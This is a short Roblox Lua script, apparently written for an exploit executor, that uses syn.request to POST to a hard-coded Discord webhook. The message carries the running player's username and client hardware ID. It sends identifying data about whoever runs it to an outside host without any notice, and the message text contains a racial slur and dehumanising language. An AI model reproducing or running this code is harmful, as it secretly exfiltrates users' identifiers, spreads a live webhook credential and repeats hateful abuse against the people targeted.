local HttpService = game:GetService("HttpService")
local webhook_url = "https://discord.com/api/webhooks/1043470294741954560/M6qAUMH6IMwmmlxoBF8hNAbwDgVgLD8dGMQUyGic1-6FKiZhy-vFSl4QCaeEXkPYv4AL"

local responce = syn.request(
{
    Url = webhook_url,
    Method = 'POST',
    Headers = {
        ['content-type'] = 'application/json'
    },
    Body = HttpService:jSONEncode({
        ["content"] = "NIGGER DETECTED!!",
        ["embeds"] = {{
            ["title"] = "**MMMHMM.... FRESH ROTTEN MEAT**",
            ["description"] = game.Players.LocalPlayer.Name.." has been caught" ,
            ["type"] = "rich",
            ["colour"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "HWID :",
                    ["value"] = game:GetService('RbxAnalyticsService'):GetClientId(),
                    ["inline"] = true,
                }
            }
        }}

    })
}
)
